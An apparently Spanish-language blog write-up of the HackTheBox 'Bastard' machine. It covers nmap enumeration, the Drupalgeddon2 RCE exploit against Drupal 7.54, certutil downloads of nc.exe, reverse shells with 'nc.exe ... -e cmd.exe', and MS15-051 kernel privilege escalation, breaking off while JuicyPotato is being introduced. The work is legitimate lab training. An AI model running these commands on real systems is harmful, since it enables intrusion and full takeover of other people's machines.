@@ -1,0 +1,1201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Bastard</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Bastard | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Bastard" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Windows nivel medio, vamos a romper Drupal 7.54 y veremos dos maneras de escalar, generando procesos maliciosos con ayuda del privilegio SeImpersonate y de JuicyPotato o explotando el lindo kernel." />
+<meta property="og:description" content="Máquina Windows nivel medio, vamos a romper Drupal 7.54 y veremos dos maneras de escalar, generando procesos maliciosos con ayuda del privilegio SeImpersonate y de JuicyPotato o explotando el lindo kernel." />
+<link rel="canonical" href="http://localhost:4000/htb/bastard" />
+<meta property="og:url" content="http://localhost:4000/htb/bastard" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-08-11T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7banner.png" />
+<meta property="twitter:title" content="HackTheBox - Bastard" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-08-11T00:00:00-07:00","datePublished":"2021-08-11T00:00:00-07:00","description":"Máquina Windows nivel medio, vamos a romper Drupal 7.54 y veremos dos maneras de escalar, generando procesos maliciosos con ayuda del privilegio SeImpersonate y de JuicyPotato o explotando el lindo kernel.","headline":"HackTheBox - Bastard","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/bastard"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/bastard"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Bastard</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-08-11">11 Aug 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7banner.png" alt="HackTheBox - Bastard">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Windows nivel medio, vamos a romper <strong>Drupal 7.54</strong> y veremos dos maneras de escalar, generando procesos maliciosos con ayuda del privilegio <strong>SeImpersonate</strong> y de <strong>JuicyPotato</strong> o explotando el lindo <strong>kernel</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7bastardHTB.png" alt="7bastardHTB" /></p>
+
+<h2 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h2>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/1">ch4p (the creator)</a>.</p>
+
+<p>Inicialmente encontraremos el gestor de contenido <code>Drupal</code> en su versión <code>7.54</code> corriendo en el puerto <strong>80</strong>, investigando llegaremos a la vuln ya muy conocida <code>Drupalgeddon2</code>, aprovechándonos de algunos exploits lograremos ejecutar comandos en el sistema como el usuario <code>nt authority\iusr</code>. Generaremos una reverse Shell para estar más cómodos (y rápidos).</p>
+
+<p>Estando ya en el sistema veremos dos maneras de escalar privilegios:</p>
+
+<ol>
+  <li>Usando un privilegio bastante llamativo: <code>SeImpersonate</code>, ya que existen varios exploits de la “familia patata” que se aprovechan de él.</li>
+  <li>Explotando el <strong>kernel</strong> de <code>Windows</code> 🥴</li>
+</ol>
+
+<p>Lograremos explotarla de las dos maneras para finalmente conseguir una <strong>Reverse Shell</strong> como el usuario <code>nt authority\system</code> en el sistema (:</p>
+
+<p>🌌 <strong><em>He creado un <code>autopwn</code> para automatizar toodo y mediante la explotación del privilegio conseguir una Shell como diosito. Lo único es que debes tener es el binario <code>nc.exe</code> y el binario <code>JuicyPotato.exe</code> en la misma ruta que el script:</em></strong></p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/bastard/autopwn_bastard.py">autopwn_bastard.py</a></p>
+</blockquote>
+
+<p>…</p>
+
+<h3 id="clasificación-de-la-máquina-según-la-gentesita">Clasificación de la máquina según la gentesita</h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Vulns conocidas y apunta mucho a la realidad.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Movimientos guturalmente prurales.</p>
+
+<ol>
+  <li><a href="#reconocimiento">Reconocimiento</a>.
+    <ul>
+      <li><a href="#enum-nmap">Enumeración de puertos con nmap</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#enumeracion">Enumeración</a>.
+    <ul>
+      <li><a href="#puerto-80">Encontramos al <strong>CMS Drupal 7</strong> corriendo sobre el puerto 80</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#explotacion">Explotación: jugamos con <strong>Drupalgeddon2</strong> para obtener <strong>RCE</strong></a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios, subimos de dos maneras:</a>
+    <ul>
+      <li><a href="#ms15-051"><strong>MS15-051</strong> - Vulnerabilities in Windows Kernel</a>.</li>
+      <li><a href="#seimpersonate-juicy">Aprovechándonos del privilegio <strong>SeImpersonate</strong></a>.</li>
+    </ul>
+  </li>
+</ol>
+
+<p>…</p>
+
+<h1 id="reconocimiento">Reconocimiento <a href="#reconocimiento">#</a></h1>
+
+<p>…</p>
+
+<h2 id="enum-nmap">Enumeración de puertos con nmap <a href="#enum-nmap">📌</a></h2>
+
+<p>Como siempre vamos a empezar encontrando que puertos tiene expuestos la máquina, esto para encaminar nuestra ruta hacia la explotación. Jugaremos con <code>nmap</code> para esto:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v 10.10.10.9 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función <strong>extractPorts</strong></a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Pero este escaneo va baaaaaaastaaante lento, así que le agregamos el parámetro <code>--min-rate</code> para indicarle que en cada petición que haga no envíe menos de N paquetes, en nuestro caso <code>2000</code> paquetes:</p>
+
+<p>📝 <strong><em>Es importante realizar el escaneo normal (sin parámetros de velocidad), ya que pueda que al ir tan rápido nos saltemos algún puerto</em></strong>.</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v --min-rate=2000 10.10.10.9 -oG initScan
+</code></pre>
+
+<p>El escaneo nos devuelve:</p>
+
+<pre><code class="language-bash">❱ cat initScan
+# Nmap 7.80 scan initiated Mon Aug  9 25:25:25 2021 as: nmap -p- --open -v --min-rate=2000 -oG initScan 10.10.10.9
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.9 ()	Status: Up
+Host: 10.10.10.9 ()	Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///	Ignored State: filtered (65533)
+# Nmap done at Mon Aug  9 25:25:25 2021 -- 1 IP address (1 host up) scanned in 71.42 seconds
+</code></pre>
+
+<p>Solo dos puertos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://searchnetworking.techtarget.com/definition/port-80">HTTP</a></strong>: Un servidor web.</td>
+    </tr>
+    <tr>
+      <td>135</td>
+      <td style="text-align: left"><strong><a href="https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc">RPC</a></strong>: Permite la comunicación entre computadoras sin necesidad de conocer detalles de la red.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ahora vamos a realizar un segundo escaneo, pero para encontrar que versiones y scripts tienen relación con cada puerto (servicio):</p>
+
+<p><strong>~(Usando la función <code>extractPorts</code> (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno (en este caso no es relevante, pero bueno, en caso de tener muchos puertos es muy útil.</strong></p>
+
+<pre><code class="language-bash">❱ extractPorts initScan 
+[*] Extracting information...
+
+    [*] IP Address: 10.10.10.9
+    [*] Open ports: 80,135
+
+[*] Ports copied to clipboard
+</code></pre>
+
+<p><strong>)~</strong></p>
+
+<pre><code class="language-bash">❱ nmap -p 80,135 -sC -sV 10.10.10.9 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Y este escaneo nos muestra:</p>
+
+<pre><code class="language-bash">❱ cat portScan
+# Nmap 7.80 scan initiated Mon Aug  9 25:25:25 2021 as: nmap -p 80,135 -sC -sV -oN portScan 10.10.10.9
+Nmap scan report for 10.10.10.9
+Host is up (0.11s latency).
+
+PORT    STATE SERVICE VERSION
+80/tcp  open  http    Microsoft IIS httpd 7.5
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
+135/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Aug  9 25:25:25 2021 -- 1 IP address (1 host up) scanned in 33.20 seconds
+</code></pre>
+
+<p>Pfff, variedad e.e</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Microsoft IIS httpd 7.5</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Vemos el <strong>CMS</strong> <code>Drupal 7</code> y también varias rutas que <code>nmap</code> descubrió: (<code>includes/</code>, <code>misc/</code>…)</p>
+
+<p>Listones, vainitas pa mirar, metámosle fuego!!</p>
+
+<p>…</p>
+
+<h1 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h1>
+
+<p>…</p>
+
+<h2 id="puerto-80">Puerto 80 <a href="#puerto-80">📌</a></h2>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Bien confirmamos el gestor de contenido <a href="https://www.inboundcycle.com/blog-de-inbound-marketing/drupal-que-es-caracteristicas-y-funcionalidades">(CMS) Drupal</a> por el logo e.e, pero si quisiéramos corroborarlo al 100% podemos usar <code>whatweb</code>:</p>
+
+<pre><code class="language-bash">❱ whatweb http://10.10.10.9/
+http://10.10.10.9/ [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.9], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], Microsoft-IIS[7.5], PHP[5.3.28,], PasswordField[pass], Script[text/javascript], Title[Welcome to 10.10.10.9 | 10.10.10.9], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.3.28, ASP.NET]
+</code></pre>
+
+<p>Destacamos tanto a <code>Drupal 7</code> como la versión del <code>PHP 5.3.28</code>.</p>
+
+<p>📓 <strong><em>“Drupal es un CMS o sistema de gestión de contenidos que se utiliza para crear sitios web dinámicos y con gran variedad de funcionalidades.”</em></strong> <a href="https://groups.drupal.org/node/148379">drupal.groups</a>.</p>
+
+<p>Así que perrrrfecto, sigamos…</p>
+
+<p>Validando las rutas descubiertas por <code>nmap</code> todas las carpetas nos devuelven que no tenemos permitido ver su contenido :( peeeero leyendo el objeto <code>CHANGELOG.txt</code> encontramos esto:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7page80_CHANGELOGtxt.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Es un log de los cambios que se han introducido en cada actualización, la última habla de la versión <code>7.54</code>, así que podemos pensar que nuestro servidor web tiene esa versión. Esto nos abre la puerta para buscar vulnerabilidades relacionadas con ella…</p>
+
+<p>…</p>
+
+<h1 id="explotacion">Explotación <a href="#explotacion">#</a></h1>
+
+<p>Encontramos varios recursos, entre ellos:</p>
+
+<ol>
+  <li><a href="https://hackerone.com/reports/1063256">Reporte hackerone - [CVE-2018-7600] Remote Code Execution due to outdated Drupal server</a>.</li>
+  <li><a href="https://github.com/dreadlocked/Drupalgeddon2">github.com/dreadlocked/Drupalgeddon2</a>.</li>
+  <li><a href="https://github.com/pimps/CVE-2018-7600">github.com/pimps/CVE-2018-7600</a>.</li>
+  <li><a href="https://github.com/FireFart/CVE-2018-7600">github.com/FireFart/CVE-2018-7600 - Acá se ve clarita la petición que logra la explotación</a>.</li>
+</ol>
+
+<p>(<em>Todos los exploits funcionales</em>)</p>
+
+<p>En el primer recurso se habla de una vulnerabilidad en el CMS <strong>Drupal</strong> la cual permite ejecutar comandos en el sistema:</p>
+
+<p>📓 <strong><em>“Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations.”</em></strong> <a href="https://hackerone.com/reports/1063256">hackerone - chron0x</a></p>
+
+<p>En él hace referencia al segundo recurso de nuestra lista, que nos lleva a profundizar un poco sobre <code>Drupalgeddon2</code> (<code>CVE-2018-7600</code>)… Encontramos este gran post de <strong>Vicente Motos</strong> por parte de <a href="https://www.hackplayers.com/2018/04/llega-drupalgeddon2-rce-inyectando-en-arrays.html">hackplayers</a> en el que explica de una manera suuuper sencilla la explotación, vayan y visítenlo.</p>
+
+<ul>
+  <li><a href="https://www.hackplayers.com/2018/04/llega-drupalgeddon2-rce-inyectando-en-arrays.html">¡Llega #Drupalgeddon2! RCE inyectando en arrays renderizables</a>.</li>
+</ul>
+
+<p>Básicamente el problema se presenta por la NO sanitización de las solicitudes <code>AJAX</code> que viajan mediante el <strong>Form API</strong>, lo que permite la inyección de cositas locas en la estructura (en los arrays que renderiza el proceso). De nuevo, les recomiendo mucho leer el post de arriba, ta buenazo!</p>
+
+<p>Perfecto, apoyados en esa explotación podemos lograr una ejecución remota de comandos yyyyyyyyyy esa es la finalidad de los 3 exploits referenciados antes. Jugaremos con el <code>2</code> el cual en caso de tener éxito nos devuelve una <strong>Fake Shell</strong> (simula que estamos en una terminal, pero no, solo esta ejecutando el comando, no nos podemos mover de directorio ni nada interactivo) en la que simplemente debemos pasar el comando y tendremos nuestra respuesta, pues intentemos:</p>
+
+<p>Clonamos el repo y ejecutamos:</p>
+
+<pre><code class="language-bash">❱ ruby drupalgeddon2.rb 
+Traceback (most recent call last):
+        2: from drupalgeddon2.rb:16:in `&lt;main&gt;'
+        1: from /usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require'
+/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require': cannot load such file -- highline/import (LoadError)
+</code></pre>
+
+<p>El error es de nuestro entorno, ya que no encuentra la librería <code>highline</code>, la instalamos:</p>
+
+<pre><code class="language-bash">❱ gem install highline
+</code></pre>
+
+<p>Yyyy:</p>
+
+<pre><code class="language-bash">❱ ruby drupalgeddon2.rb 
+Usage: ruby drupalggedon2.rb &lt;target&gt; [--authentication] [--verbose]
+Example for target that does not require authentication:
+       ruby drupalgeddon2.rb https://example.com
+Example for target that does require authentication:
+       ruby drupalgeddon2.rb https://example.com --authentication
+</code></pre>
+
+<p>Listos, ejecutémoslo contra el recurso:</p>
+
+<pre><code class="language-bash">❱ ruby drupalgeddon2.rb http://10.10.10.9
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7bash_drupalgeddonRBexploit_rce1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Bien, el programa nos indica que existe la vuln y tiene posibilidad de ejecutar comandos, después de eso hace unas pruebas para escribir un archivo en el sistema yyyyy finalmente obtenemos la <strong>Fake Shell</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7bash_drupalgeddonRBexploit_rce2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Liiiiistones, “tamos” en la máquina, pero medio feo estar en una <strong>Fake Shell</strong>, así que subamos el binario <code>nc.exe</code> y entablémonos una Reverse Shell:</p>
+
+<p>Nos posicionamos en la ruta donde esté el binario y levantamos un servidor web:</p>
+
+<pre><code class="language-bash">❱ python3 -m http.server
+</code></pre>
+
+<p>Y ahora desde la <strong>Fake</strong> le decimos que busque en ese servidor web el archivo <code>nc.exe</code> y lo suba a nuestra ruta actual:</p>
+
+<pre><code class="language-bash">drupalgeddon2&gt;&gt; certutil.exe -f -urlcache -split http://10.10.14.8:8000/nc.exe nc.exe
+</code></pre>
+
+<p>Y ya tendríamos el binario en la máquina:</p>
+
+<pre><code class="language-powershell">drupalgeddon2&gt;&gt; dir
+Volume in drive C has no label.
+ Volume Serial Number is 605B-4AAA
+
+ Directory of C:\inetpub\drupal-7.54
+
+...
+10/08/2021  25:25             45.272 nc.exe
+...
+</code></pre>
+
+<p>Ahora nos ponemos en escucha por algún puerto, en mi caso el <code>4433</code>:</p>
+
+<pre><code class="language-bash">❱ nc -lvp 4433
+</code></pre>
+
+<p>Y en la máquina víctima ejecutamos:</p>
+
+<pre><code class="language-bash">drupalgeddon2&gt;&gt; .\nc.exe 10.10.14.8 4433 -e cmd.exe
+</code></pre>
+
+<p>Donde le indicamos que envíe una petición a nuestro listener y una vez se entable la conexión nos ejecute <code>cmd.exe</code>, o sea una terminal <strong>CMD</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7bash_iusrRevSH_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Y ya tenemos una Shell medio interactiva, digo medio, ya que si por cosas de la vida hacemos <code>CTRL + C</code> pues perderemos la terminal :( y no tenemos histórico :( x2</p>
+
+<p>Pero bueno, ahora si estamos dentro del sistemaaaaaaaaaaaaaaaaaaaaaaa, sigamos…</p>
+
+<p>…</p>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h1>
+
+<p>Encontré 2 rutas para lograr el privesc, les dejo los links de cada apartado:</p>
+
+<ul>
+  <li><a href="#ms15-051"><strong>MS15-051</strong> - Vulneramos el <strong>kernel</strong> del sistema</a>.</li>
+  <li><a href="#seimpersonate-juicy">Aprovechándonos del privilegio <strong>SeImpersonate</strong></a>.</li>
+</ul>
+
+<p>…</p>
+
+<h2 id="ms15-051">Rompemos el Kernel de Windows (<u>MS15-051</u>) <a href="#ms15-051">📌</a></h2>
+
+<p>Si jugamos con <code>systeminfo</code> podemos (a veces) ver todo lo relacionado con el sistema operativo, como la arquitectura, la versión del SO y su nombre (otras cositas más), pues veamos que nos responde:</p>
+
+<pre><code class="language-powershell">C:\inetpub\drupal-7.54&gt;systeminfo
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7cmd_iusrSH_systeminfo.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Bien, para ahorrar tiempo y ojos, existen herramientas que toman toooooodo ese output de arriba y lo relacionan con bases de datos de exploits, esto para encontrar vulns relacionadas con la versión del SO. Una de ellas se llama <a href="https://github.com/bitsadmin/wesng">wesng</a> y es la que usaremos, nos clonamos el repo, nos copiamos el contenido de <code>systeminfo</code> y lo pegamos en un archivo (lo llamaré <strong>systeminfo.txt</strong>) yy ejecutamos:</p>
+
+<pre><code class="language-bash"># Para que tome las ultimas vulns
+❱ python3 wes.py --update
+</code></pre>
+
+<p>Y ahora le pasamos el archivo <code>systeminfo.txt</code> peeeero le indicamos que solo queremos ver vulns relacionadas con “escalar privilegios”:</p>
+
+<pre><code class="language-bash">❱ python3 wes.py systeminfo.txt --impact "Elevation of Privilege"
+</code></pre>
+
+<p>Y nos devuelve vaaaaaarias cositas, entre ellas 2 referencias a exploits contra el <strong>Kernel</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7bash_wesng_kernelExploits.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Solo nos queda explorar cada exploit y ver si algunos nos funciona…</p>
+
+<p>Pero ninguna referencia nos ayudó (o a mí no me sirvieron 😟). Después de un rato buscando binarios y compilando otros, se me ocurrió simplemente buscar por el título de las vulns, o sea investigar sobre:</p>
+
+<pre><code class="language-txt">Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege
+</code></pre>
+
+<p>De primeras encontramos dos cosas, una referencia al reporte <code>MS10-015</code> (pero abajo hay por ejemplo una hacia <code>MS10-021</code>, por lo que podemos pensar que es un grupo de vulns) y su definición, así que volvemos a buscar binarios que se relacionen…</p>
+
+<p>Peeero nada. Probando, probando y probando cosas llegamos a este repo (que no sé cómo llegue, despues de varios links este fue el que me funciono 😄):</p>
+
+<ul>
+  <li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051">SecWiki/windows-kernel-exploits/MS15-051</a>.</li>
+</ul>
+
+<p>Nos descargamos el comprimido <code>MS15-051-KB3045171.zip</code>, lo descomprimimos, lo subimos a la máquina y probamos:</p>
+
+<pre><code class="language-powershell">C:\inetpub\drupal-7.54&gt;.\ms15-051.exe
+.\ms15-051.exe
+[#] ms15-051 fixed by zcgonvh
+[#] usage: ms15-051 command 
+[#] eg: ms15-051 "whoami /all"
+</code></pre>
+
+<p>Bien es funcional e interactivo, pues ejecutemos un <code>whoami</code>:</p>
+
+<pre><code class="language-powershell">C:\inetpub\drupal-7.54&gt;.\ms15-051.exe "whoami"
+.\ms15-051.exe "whoami"
+[#] ms15-051 fixed by zcgonvh
+[!] process with pid: 1808 created.
+==============================
+nt authority\system
+</code></pre>
+
+<p>😲 apaaaa, somos <code>nt authority\system</code> :o poooooooo generémonos una <strong>Reverse Shell</strong> de unaaaaaaaaa:</p>
+
+<pre><code class="language-powershell">C:\inetpub\drupal-7.54&gt;.\ms15-051.exe "c:\inetpub\drupal-7.54\nc.exe 10.10.14.8 4434 -e cmd.exe"
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7bash_MS15_051_NTsystemSH_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Perrrrrfectisiiiimo, conseguimos una Shell explotando el <strong>kernel</strong> de <code>Windows</code>, que lindura.</p>
+
+<p>Antes de irnos veamos la otra manera de escalar…</p>
+
+<p>…</p>
+
+<h2 id="seimpersonate-juicy">Explotamos el privilegio <u>SeImpersonatePrivilege</u> <a href="#seimpersonate-juicy">📌</a></h2>
+
+<p>Si revisamos nuestros privilegios vemos 3:</p>
+
+<pre><code class="language-powershell">C:\inetpub\drupal-7.54&gt;whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name          Description                               State  
+======================= ========================================= =======
+SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
+SeImpersonatePrivilege  Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege Create global objects                     Enabled
+</code></pre>
+
+<p>Jugando con <a href="https://github.com/gtworek/Priv2Admin">esta lista</a> de privilegios encontramos que <code>SeImpersonatePrivilege</code> es bastante llamativo porque nos permite crear un proceso como otro usuario del sistema 😮😮😮🤪</p>
+
+<p>Existen varias herramientas de la llamada <code>Potato Family</code> que explotan el privilegio, investigando un poco más llegamos a esta guía donde muestran el uso de una de ellas: <code>JuicyPotato.exe</code>:</p>
+
+<ul>
+  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#juicy-potato-abusing-the-golden-privileges">Juicy Potato (abusing the golden privileges)</a>.</li>
+</ul>
+
+<p>Básicamente le pasamos el puerto en el que queremos que escuche el proceso, el programa que ejecutara, los argumentos (si los lleva), el <strong>como</strong> va a crear el proceso y (es opcional, pero después de probar cositas vemos que es necesario en este caso) un <code>CLSID</code> (un identificador de un objeto con el que queremos interactuar (<a href="https://docs.microsoft.com/en-us/windows/win32/com/com-class-objects-and-clsids">COM</a>)).</p>
+
